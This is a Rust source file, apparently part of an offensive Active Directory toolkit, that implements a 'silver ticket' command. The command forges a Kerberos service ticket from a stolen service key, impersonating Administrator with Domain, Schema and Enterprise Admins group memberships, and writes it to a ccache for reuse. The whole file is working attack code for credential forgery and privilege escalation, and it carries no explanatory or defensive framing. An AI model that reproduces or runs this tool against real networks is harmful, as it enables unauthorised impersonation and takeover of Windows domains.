//! Silver ticket: forge a service ticket (TGS) for an SPN with the target
//! service account's AES256 key. Bypasses the KDC entirely at presentation.

use anyhow::{Context, Result};
use clap::Parser;

#[derive(Parser)]
pub(crate) struct SilverArgs {
    /// Kerberos realm (e.g. CORP.LOCAL).
    #[arg(long)]
    pub realm: String,
    /// Service key: AES256 (64 hex) by default, or the RC4/NT hash (32 hex) with --rc4.
    #[arg(long)]
    pub service_aes256: String,
    /// Forge an RC4-HMAC (etype 23) ticket — interpret the key as the service NT hash (legacy DCs).
    #[arg(long)]
    pub rc4: bool,
    /// Target SPN (e.g. cifs/dc01.corp.local).
    #[arg(long)]
    pub spn: String,
    /// Domain SID (S-1-5-21-a-b-c).
    #[arg(long)]
    pub domain_sid: String,
    /// Identity to impersonate (default Administrator).
    #[arg(long, default_value = "Administrator")]
    pub user: String,
    /// RID of the impersonated account (default 500).
    #[arg(long, default_value_t = 500)]
    pub rid: u32,
    /// Group RIDs to embed (default: Users + Domain/Schema/Enterprise Admins + GPO Creators).
    #[arg(long, value_delimiter = ',', default_value = "513,512,520,518,519")]
    pub groups: Vec<u32>,
    /// Write the forged service ticket to this ccache path.
    #[arg(long)]
    pub out: Option<String>,
}

/// Silver ticket: forge a service ticket (TGS) for an SPN, sealed + PAC-signed with the target
/// service account's AES256 key. Presented directly to the service (AP-REQ) without the KDC —
/// so the KDC signature is unchecked. Emits a ccache for use with `-k` / KRB5CCNAME tooling.
pub(crate) async fn silver(a: SilverArgs) -> Result<()> {
    use adhammer_kerberos::pac::ForgeIdentity;

    let key = crate::parse_forge_key(&a.service_aes256, a.rc4)?;
    let subs: Vec<u32> = a
        .domain_sid
        .trim_start_matches("S-1-5-")
        .split('-')
        .map(|x| x.parse::<u32>())
        .collect::<std::result::Result<_, _>>()
        .context("--domain-sid must be S-1-5-21-a-b-c")?;

    let id = ForgeIdentity {
        user: a.user.clone(),
        rid: a.rid,
        primary_gid: 513,
        group_rids: a.groups.clone(),
        domain_subauths: subs,
        logon_server: a.realm.split('.').next().unwrap_or("DC").to_uppercase(),
        logon_domain: a.realm.split('.').next().unwrap_or("DOMAIN").to_uppercase(),
    };
    let tgt = adhammer_kerberos::forge_silver_tgt(&id, &a.realm, &key, &a.spn, a.rc4)?;
    println!(
        "[+] forged silver ticket: {}@{} for {} (rid {})",
        a.user, a.realm, a.spn, a.rid
    );
    if let Some(out) = &a.out {
        let cc = adhammer_kerberos::silver_ccache(&tgt, &a.user, &a.spn)?;
        std::fs::write(out, &cc)?;
        println!("[+] wrote ccache → {out} ({} bytes)", cc.len());
    }
    Ok(())
}
